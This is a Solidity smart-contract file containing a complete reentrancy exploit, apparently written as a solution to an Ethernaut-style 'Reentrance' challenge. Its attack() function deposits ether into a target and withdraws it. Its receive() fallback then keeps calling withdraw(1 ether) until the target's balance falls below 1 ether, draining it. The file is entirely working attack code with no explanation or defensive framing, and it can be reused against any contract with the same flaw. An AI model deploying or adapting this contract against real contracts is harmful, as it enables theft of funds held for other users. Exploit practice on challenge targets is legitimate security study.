// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface ReentranceInterface {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
  function balanceOf(address _who) external view returns (uint balance);
}

contract AttackReentrance{
  ReentranceInterface reentrance;
  address reentranceAddress;

  constructor(address _reentranceAddress){
    reentrance = ReentranceInterface(_reentranceAddress);
    reentranceAddress = _reentranceAddress;
  }

  function attack() external payable{
    reentrance.donate{value:msg.value}(address(this));
    reentrance.withdraw(msg.value);
  }

  receive() external payable{
    if(reentranceAddress.balance >= 1 ether){
      reentrance.withdraw(1 ether);
    }
  }

}